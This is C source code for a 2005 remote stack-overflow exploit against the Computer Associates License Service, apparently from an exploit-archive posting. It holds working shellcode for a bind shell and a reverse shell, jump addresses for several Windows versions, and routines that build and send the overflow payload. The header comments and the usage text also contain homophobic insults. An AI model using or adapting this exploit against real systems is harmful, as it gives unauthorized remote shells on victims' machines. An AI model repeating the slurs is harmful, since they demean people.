/*
Computer-Associates, License Service Stack Overflow

Homepage:         ca.com
Affected version: v1.61 and below (in eTrust, Unicenter, BrightStor, etc..)
Patched  version: hotfix
Link:             ca.com
Date:             04 March 2005

Application Risk: Tsunami
Internet Risk:    High

Dicovery Credits: Barnaby Jack (eeye.com)
Exploit Credits : class101

Hole History:

		02-3-2005: BOF flaws published by Barnaby Jack of eeye.com
		04-3-2005: metasploit module released
		06-2-2005: hat-squad exploit released using again another way than msf,
		           a nasty way auto-bypassing XP/2003 stack's protections :)

Notes:

		-2 bad chars, 0x00, 0x20
		-This is possible to trigger at least several big flaws per affected commands,
			case1: you own eip, ebx 4 bytes up to it is usable
			case2: you own eip, esp pointing right after is usable
			case3: you own eip, esi pointing into the buffer
			In this exploit, I have choosed case2, allowing us to overwrite eip with a
			jmp/call esp, a push esp, retn or why not something useful in a ca's dll, w00t :P, can be a good challenge to search on this, look around 
			0x10010000.licscvr.dll 			
		-tiny upgrade of the awesome vlad902's shellcode to remove that f'king 0x20 into the decoded reverse shellcode v1.31
		    by the way, sending up this bad char to the bottom of what you know of some amazing wannabel33t deface kiddies crawling my website,
		    talking in sh0utb0x, sucking my c0x, answer in a code, he! :-) (IHS , iranian homosec deface team to not name them :>)
		-beware that the ca license service autoban and this is possible to know the OS with
		    A0 GETCONFIG SELF A <EOM>

Greet:

		NIMA MAJIDI
		BEHRANG FOULADI
		PEJMAN
		HAMID! :)
		HAT-SQUAD.COM
		metasploit.com
		A^C^E of addict3d.org
		str0ke of milw0rm.com
		and my homy CLASS101.ORG :>
*/

#include <stdio.h>
#include <string.h>
#include <time.h>
#ifdef WIN32
#include "winsock2.h"
#pragma comment(lib, "ws2_32")
#else
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#endif

char scode[]=
"\x33\xC9\x83\xE9\xAF\xD9\xEE\xD9\x74\x24\xF4\x5B\x81\x73\x13\xBB"
"\x1E\xD3\x6A\x83\xEB\xFC\xE2\xF4\x47\x74\x38\x25\x53\xE7\x2C\x95"
"\x44\x7E\x58\x06\x9F\x3A\x58\x2F\x87\x95\xAF\x6F\xC3\x1F\x3C\xE1"
"\xF4\x06\x58\x35\x9B\x1F\x38\x89\x8B\x57\x58\x5E\x30\x1F\x3D\x5B"
"\x7B\x87\x7F\xEE\x7B\x6A\xD4\xAB\x71\x13\xD2\xA8\x50\xEA\xE8\x3E"
"\x9F\x36\xA6\x89\x30\x41\xF7\x6B\x50\x78\x58\x66\xF0\x95\x8C\x76"
"\xBA\xF5\xD0\x46\x30\x97\xBF\x4E\xA7\x7F\x10\x5B\x7B\x7A\x58\x2A"
"\x8B\x95\x93\x66\x30\x6E\xCF\xC7\x30\x5E\xDB\x34\xD3\x90\x9D\x64"
"\x57\x4E\x2C\xBC\x8A\xC5\xB5\x39\xDD\x76\xE0\x58\xD3\x69\xA0\x58"
"\xE4\x4A\x2C\xBA\xD3\xD5\x3E\x96\x80\x4E\x2C\xBC\xE4\x97\x36\x0C"
"\x3A\xF3\xDB\x68\xEE\x74\xD1\x95\x6B\x76\x0A\x63\x4E\xB3\x84\x95"
"\x6D\x4D\x80\x39\xE8\x4D\x90\x39\xF8\x4D\x2C\xBA\xDD\x76\xD3\x0F"
"\xDD\x4D\x5A\x8B\x2E\x76\x77\x70\xCB\xD9\x84\x95\x6D\x74\xC3\x3B"
"\xEE\xE1\x03\x02\x1F\xB3\xFD\x83\xEC\xE1\x05\x39\xEE\xE1\x03\x02"
"\x5E\x57\x55\x23\xEC\xE1\x05\x3A\xEF\x4A\x86\x95\x6B\x8D\xBB\x8D"
"\xC2\xD8\xAA\x3D\x44\xC8\x86\x95\x6B\x78\xB9\x0E\xDD\x76\xB0\x07"
"\x32\xFB\xB9\x3A\xE2\x37\x1F\xE3\x5C\x74\x97\xE3\x59\x2F\x13\x99"
"\x11\xE0\x91\x47\x45\x5C\xFF\xF9\x36\x64\xEB\xC1\x10\xB5\xBB\x18"
"\x45\xAD\xC5\x95\xCE\x5A\x2C\xBC\xE0\x49\x81\x3B\xEA\x4F\xB9\x6B"
"\xEA\x4F\x86\x3B\x44\xCE\xBB\xC7\x62\x1B\x1D\x39\x44\xC8\xB9\x95"
"\x44\x29\x2C\xBA\x30\x49\x2F\xE9\x7F\x7A\x2C\xBC\xE9\xE1\x03\x02"
"\x54\xD0\x33\x0A\xE8\xE1\x05\x95\x6B\x1E\xD3\x6A";

char scode2[]=
/*original vlad902's reverse shellcode from metasploit.com
  NOT xored, modded by class101 to remove the common badchar "\x20"
  original bytes + modded = 291 + 3 = 294 bytes reverse shellcode v1.31*/
"\xFC\x6A"
"\xEB\x52" /*modded adjusting jump*/
"\xE8\xF9\xFF\xFF\xFF\x60\x8B\x6C\x24\x24\x8B\x45\x3C\x8B\x7C\x05"
"\x78\x01\xEF"
"\x83\xC7\x01" /*modded, adding 1 to edi*/
"\x8B\x4F\x17" /*modded, adjusting ecx*/
"\x8B\x5F\x1F" /*modded, adjusting ebx, "\x20" out, yeahouu ;>*/
"\x01\xEB\xE3\x30\x49\x8B\x34\x8B\x01\xEE\x31\xC0\x99\xAC\x84\xC0"
"\x74\x07\xC1\xCA\x0D\x01\xC2\xEB\xF4\x3B\x54\x24\x28\x75\xE3"
"\x8B\x5F\x23" /*modded, adjusting ebx*/
"\x01\xEB\x66\x8B\x0C\x4B"
"\x8B\x5F\x1B" /*modded, adjusting ebx*/
"\x01\xEB\x03\x2C\x8B\x89\x6C\x24\x1C\x61\xC3\x31\xC0\x64\x8B\x40"
"\x30\x8B\x40\x0C\x8B\x70\x1C\xAD\x8B\x40\x08\x5E\x68\x8E\x4E\x0E"
"\xEC\x50\xFF\xD6\x31\xDB\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32"
"\x5F\x54\xFF\xD0\x68\xCB\xED\xFC\x3B\x50\xFF\xD6\x5F\x89\xE5\x66"
"\x81\xED\x08\x02\x55\x6A\x02\xFF\xD0\x68\xD9\x09\xF5\xAD\x57\xFF"
"\xD6\x53\x53\x53\x53\x43\x53\x43\x53\xFF\xD0\x68\x00\x00\x00\x00"
"\x66\x68\x00\x00\x66\x53\x89\xE1\x95\x68\xEC\xF9\xAA\x60\x57\xFF"
"\xD6\x6A\x10\x51\x55\xFF\xD0\x66\x6A\x64\x66\x68\x63\x6D\x6A\x50"
"\x59\x29\xCC\x89\xE7\x6A\x44\x89\xE2\x31\xC0\xF3\xAA\x95\x89\xFD"
"\xFE\x42\x2D\xFE\x42\x2C\x8D\x7A\x38\xAB\xAB\xAB\x68\x72\xFE\xB3"
"\x16\xFF\x75\x28\xFF\xD6\x5B\x57\x52\x51\x51\x51\x6A\x01\x51\x51"
"\x55\x51\xFF\xD0\x68\xAD\xD9\x05\xCE\x53\xFF\xD6\x6A\xFF\xFF\x37"
"\xFF\xD0\x68\xE7\x79\xC6\x79\xFF\x75\x04\xFF\xD6\xFF\x77\xFC\xFF"
"\xD0\x68\xEF\xCE\xE0\x60\x53\xFF\xD6\xFF\xD0";

char payload[8192];

char esp2k[]="\x9F\xF8\x1A\x01";  /*jmp.esp*/
char espNT[]="\xA8\x14\xF9\x77";  /*push.esp.return*/
char espXP1[]="\x5E\xF0\xF7\x77";  /*push.esp.return*/
char espXP2[]="\x5C\xC3\x92\x7C";  /*push.esp.return*/
char espk3[]="\xAB\x8B\xFB\x77";  /*jmp.esp*/
char EOL[]="\x0D\x0A";
char talk1[]=
"\x47\x42\x52\x20";
char talk2[]=
"\x20\x3C\x45\x4F\x4D\x3E";

#ifdef WIN32
	WSADATA wsadata;
#endif

void ver();
void usage(char* us);

int main(int argc,char *argv[])
{
	ver();
	unsigned long gip;
	unsigned short gport;
	char *target, *os;
	if (argc>6||argc<3||atoi(argv[1])>5||atoi(argv[1])<1){usage(argv[0]);return -1;}
	if (argc==5){usage(argv[0]);return -1;}
    if (strlen(argv[2])<7){usage(argv[0]);return -1;}
    if (argc==6)
	{
        if (strlen(argv[4])<7){usage(argv[0]);return -1;}
	}
#ifndef WIN32
	if (argc==6)
	{
 		gip=inet_addr(argv[4])^(long)0x00000000;
		gport=htons(atoi(argv[5]))^(short)0x0000;
	}
#define Sleep		sleep
#define SOCKET		int
#define closesocket(s) close(s)
#else
	if (WSAStartup(MAKEWORD(2,0),&wsadata)!=0){printf("[+] wsastartup error\n");return -1;}
	if (argc==6)
	{
		gip=inet_addr(argv[4])^(ULONG)0x00000000;
		gport=htons(atoi(argv[5]))^(USHORT)0x0000;
	}
#endif
	int ip=htonl(inet_addr(argv[2])), port;
	if (argc==4||argc==6){port=atoi(argv[3]);} else port=10203;
	SOCKET s;fd_set mask;struct timeval timeout; struct sockaddr_in server;
	s=socket(AF_INET,SOCK_STREAM,0);
	if (s==-1){printf("[+] socket() error\n");return -1;}
	if (atoi(argv[1]) == 1){target=esp2k;os="Win2k SP4 Server English\n[+]            Win2k SP4 Pro    English\n[+]            Win2k SP? ?      ?";}
	if (atoi(argv[1]) == 2){target=espNT;os="WinNT SP6 Wkst. English";}
	if (atoi(argv[1]) == 3){target=espXP2;os="WinXP SP2 Pro. English";}
	if (atoi(argv[1]) == 4){target=espXP1;os="WinXP SP1a Pro. English";}
	if (atoi(argv[1]) == 5){target=espk3;os="Win2003 SP4 Server English";}
	printf("[+] target(s): %s\n",os);
	server.sin_family=AF_INET;
	server.sin_addr.s_addr=htonl(ip);
	server.sin_port=htons(port);
	connect(s,( struct sockaddr *)&server,sizeof(server));
	timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask);
	switch(select(s+1,NULL,&mask,NULL,&timeout))
	{
		case -1: {printf("[+] select() error\n");closesocket(s);return -1;}
		case 0: {printf("[+] connect() error\n");closesocket(s);return -1;}
		default:
		if(FD_ISSET(s,&mask))
		{
			printf("[+] connected, constructing the payload...\n");
#ifdef WIN32
			Sleep(1000);
#else
			Sleep(1);
#endif
			strcpy(payload,talk1);
			memset(payload+4,0x90,3208);
			memcpy(payload+2024+4,target,4);
			strcat(payload,talk2);strcat(payload,EOL);
			if (argc==6)
			{
				memcpy(&scode2[167], &gip, 4);
				memcpy(&scode2[173], &gport, 2);
				memcpy(payload+2038,scode2,strlen(scode2));
			}
			else memcpy(payload+2038,scode,strlen(scode));
			if (send(s,payload,strlen(payload),0)==-1) { printf("[+] sending error 1, the server prolly rebooted.\n");return -1;}
#ifdef WIN32
			Sleep(2000);
#else
			Sleep(2);
#endif
			printf("[+] size of payload: %d\n",strlen(payload));
			printf("[+] payload sent.\n");
			return 0;
		}
	}
	closesocket(s);
#ifdef WIN32
	WSACleanup();
#endif
	return 0;
}


void usage(char* us)
{
	printf("USAGE:                                                                         \n");
	printf("      [+]  . 101_calic.exe Target VulnIP (bind mode)                           \n");
	printf("      [+]  . 101_calic.exe Target VulnIP VulnPORT (bind mode)                  \n");
	printf("      [+]  . 101_calic.exe Target VulnIP VulnPORT GayIP GayPORT (reverse mode) \n");
	printf("TARGET:                                                                        \n");
	printf("      [+] 1. Win2k  SP4  Server English (*)                                    \n");
	printf("      [+] 1. Win2k  SP4  Pro    English (*)                                    \n");
	printf("      [+] 1. Win2k  SP?  ?      ?                                              \n");
	printf("      [+] 2. WinNT  SP6  Wkst.  English (*)                                    \n");
	printf("      [+] 3. WinXP  SP2  Pro.   English                                        \n");
	printf("      [+] 4. WinXP  SP1a Pro.   English (*)                                    \n");
	printf("      [+] 5. Win2k3 SP0  Server English                                        \n");
	printf("NOTE:                                                                          \n");
	printf("      The exploit bind a cmdshell port 101 or                                  \n");
	printf("      reverse a cmdshell on your listener.                                     \n");
	printf("      A wildcard (*) mean tested working, else, supposed working.              \n");
	printf("      A symbol   (-) mean all.                                                 \n");
	printf("      Compilation msvc6, cygwin, Linux.                                        \n");
	return;
}
void ver()
{
	printf("                                                                     \n");
	printf("        ===================================================[0.1]=====\n");
	printf("        =======Computer Associates, License Client Service===========\n");
	printf("        ==============Remote Stack Overflow Exploit==================\n");
	printf("        ======coded by class101==================[Hat-Squad.com]=====\n");
	printf("        =====================================[class101.org 2005]=====\n");
	printf("                                                                     \n");
}
